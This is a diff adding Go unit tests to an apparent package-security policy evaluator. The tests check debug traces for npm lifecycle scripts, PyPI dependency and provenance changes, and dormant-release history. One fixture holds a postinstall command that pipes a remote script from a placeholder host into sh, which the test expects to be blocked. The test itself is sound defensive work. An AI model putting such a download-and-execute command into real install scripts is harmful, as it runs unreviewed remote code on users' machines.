@@ -334,9 +334,174 @@ func TestEvaluateLeavesInspectOnlyWhenFlexibleFalseValuesDisablePolicy(t *testin
 	}
 }
 
+func TestEvaluateWithOptionsCollectsNPMDebugTrace(t *testing.T) {
+	pkg := report.PackageReport{
+		Ecosystem: "npm",
+		LifecycleScripts: map[string]string{
+			"postinstall": "curl https://example.invalid/install.sh | sh",
+		},
+		LifecycleHistory: []report.VersionLifecycleScripts{
+			{Version: "1.0.0", ScriptsKnown: true},
+		},
+	}
+	config := config.Config{
+		Policy: config.PolicyConfig{
+			Alert: config.PolicyTierConfig{
+				InstallLifecycleScripts:         true,
+				InstallLifecycleHistoryVersions: 5,
+			},
+			Block: config.PolicyTierConfig{
+				SuspiciousInstallScriptCommands: true,
+			},
+		},
+	}
+
+	EvaluateWithOptions(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})
+
+	suspicious := findTrace(t, pkg.DebugTrace, "npm_suspicious_install_commands")
+	if suspicious.Status != report.DebugTraceMatch || suspicious.Severity != levelBlock {
+		t.Fatalf("suspicious trace = %+v, want BLOCK match", suspicious)
+	}
+	if !containsEvidence(suspicious, "download-and-execute") {
+		t.Fatalf("suspicious trace evidence = %+v, want command reason", suspicious.Evidence)
+	}
+
+	history := findTrace(t, pkg.DebugTrace, "npm_lifecycle_history")
+	if history.Status != report.DebugTraceMatch || history.Severity != levelAlert {
+		t.Fatalf("history trace = %+v, want ALERT match", history)
+	}
+	if !containsEvidence(history, "absent from 1 compared version(s)") {
+		t.Fatalf("history trace evidence = %+v, want comparison result", history.Evidence)
+	}
+
+	if got := findTrace(t, pkg.DebugTrace, "pypi_dependency_change").Status; got != report.DebugTraceNotApplicable {
+		t.Fatalf("pypi dependency trace status = %q, want NOT APPLICABLE", got)
+	}
+}
+
+func TestEvaluateWithOptionsCollectsPyPIDebugTrace(t *testing.T) {
+	pkg := report.PackageReport{
+		Ecosystem: "PyPI",
+		PyPILatestRelease: report.PyPIReleaseInfo{
+			Version:           "2.0.0",
+			Dependencies:      []string{"new-dependency"},
+			DependenciesKnown: true,
+			Files: []report.PyPIReleaseFile{
+				{Filename: "pkg-2.0.0-py3-none-any.whl", PackageType: "bdist_wheel", Size: 200, ProvenanceChecked: true, ProvenanceAvailable: true, ProvenanceScopes: []string{"install-target"}},
+				{Filename: "pkg-2.0.0.tar.gz", PackageType: "sdist", Size: 400, ProvenanceChecked: true, ProvenanceScopes: []string{"install-target"}},
+			},
+		},
+		PyPIReleaseHistory: []report.PyPIReleaseInfo{{
+			Version:           "1.0.0",
+			Dependencies:      []string{"old-dependency"},
+			DependenciesKnown: true,
+			Files:             []report.PyPIReleaseFile{{Filename: "pkg-1.0.0-py3-none-any.whl", PackageType: "bdist_wheel", Size: 100}},
+		}},
+	}
+	config := config.Config{
+		Policy: config.PolicyConfig{
+			Alert: config.PolicyTierConfig{
+				PyPIArtifactHistoryVersions: 5,
+				PyPIDependencyChange:        true,
+				PyPIProvenanceRequired:      true,
+				PyPIProvenanceScope:         "install-target",
+				PyPIReleaseFileCountChange:  true,
+			},
+		},
+	}
+	pkg.PyPIProvenance.RequestedScopes = []string{"install-target"}
+
+	EvaluateWithOptions(&pkg, config, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})
+
+	dependencies := findTrace(t, pkg.DebugTrace, "pypi_dependency_change")
+	if dependencies.Status != report.DebugTraceMatch || dependencies.Severity != levelAlert {
+		t.Fatalf("dependency trace = %+v, want ALERT match", dependencies)
+	}
+	for _, want := range []string{"compared against version: 1.0.0", "added dependencies: new-dependency", "removed dependencies: old-dependency"} {
+		if !containsEvidence(dependencies, want) {
+			t.Fatalf("dependency trace evidence = %+v, want %q", dependencies.Evidence, want)
+		}
+	}
+
+	provenance := findTrace(t, pkg.DebugTrace, "pypi_provenance")
+	if provenance.Status != report.DebugTraceMatch || !containsEvidence(provenance, "provenance available: 1") || !containsEvidence(provenance, "pkg-2.0.0.tar.gz") {
+		t.Fatalf("provenance trace = %+v, want summarized missing provenance", provenance)
+	}
+
+	fileCount := findTrace(t, pkg.DebugTrace, "pypi_release_file_count")
+	if fileCount.Status != report.DebugTraceMatch || !containsEvidence(fileCount, "historical median file count: 1") {
+		t.Fatalf("file count trace = %+v, want count comparison", fileCount)
+	}
+}
+
+func TestEvaluateWithOptionsCollectsDisabledTraceWhenPolicyDisabled(t *testing.T) {
+	pkg := report.PackageReport{Ecosystem: "PyPI"}
+
+	EvaluateWithOptions(&pkg, config.Config{}, time.Date(2026, 5, 29, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})
+
+	if pkg.Decision != report.DecisionInspectOnly {
+		t.Fatalf("decision = %q, want %q", pkg.Decision, report.DecisionInspectOnly)
+	}
+	if got := findTrace(t, pkg.DebugTrace, "release_age").Status; got != report.DebugTraceDisabled {
+		t.Fatalf("release age trace status = %q, want DISABLED", got)
+	}
+	if got := findTrace(t, pkg.DebugTrace, "npm_lifecycle_scripts").Status; got != report.DebugTraceNotApplicable {
+		t.Fatalf("npm lifecycle trace status = %q, want NOT APPLICABLE", got)
+	}
+	if got := findTrace(t, pkg.DebugTrace, "pypi_artifact_history").Status; got != report.DebugTraceDisabled {
+		t.Fatalf("pypi artifact history trace status = %q, want DISABLED", got)
+	}
+}
+
+func TestEvaluateWithOptionsMarksUnreliableHistoryIndeterminate(t *testing.T) {
+	pkg := report.PackageReport{
+		Ecosystem:           "npm",
+		LatestPublishedAt:   "2026-05-29T00:00:00Z",
+		PreviousPublishedAt: "2026-01-01T00:00:00Z",
+		NPMHistory: report.HistoryDiagnostics{
+			IndeterminateReason: "npm release history contains malformed version or publish-time metadata",
+		},
+	}
+	config := config.Config{
+		Policy: config.PolicyConfig{
+			Alert: config.PolicyTierConfig{DormantReleaseThresholdDays: 30},
+		},
+	}
+
+	EvaluateWithOptions(&pkg, config, time.Date(2026, 5, 30, 12, 0, 0, 0, time.UTC), EvaluationOptions{Debug: true})
+
+	trace := findTrace(t, pkg.DebugTrace, "dormant_release")
+	if trace.Status != report.DebugTraceIndeterminate || trace.Severity != levelAlert {
+		t.Fatalf("trace = %+v, want ALERT indeterminate", trace)
+	}
+	if len(pkg.Findings) != 1 || !strings.Contains(pkg.Findings[0].Message, "indeterminate") {
+		t.Fatalf("findings = %+v, want indeterminate finding", pkg.Findings)
+	}
+}
+
 func hasFindingWithSeverity(findings []report.Finding, severity string) bool {
 	for _, finding := range findings {
 		if finding.Severity == severity {
+			return true
+		}
+	}
+	return false
+}
+
+func findTrace(t *testing.T, trace []report.DebugTraceEntry, checkID string) report.DebugTraceEntry {
+	t.Helper()
+	for _, entry := range trace {
+		if entry.CheckID == checkID {
+			return entry
+		}
+	}
+	t.Fatalf("trace missing %q: %+v", checkID, trace)
+	return report.DebugTraceEntry{}
+}
+
+func containsEvidence(entry report.DebugTraceEntry, want string) bool {
+	for _, evidence := range entry.Evidence {
+		if strings.Contains(evidence, want) {
 			return true
 		}
 	}
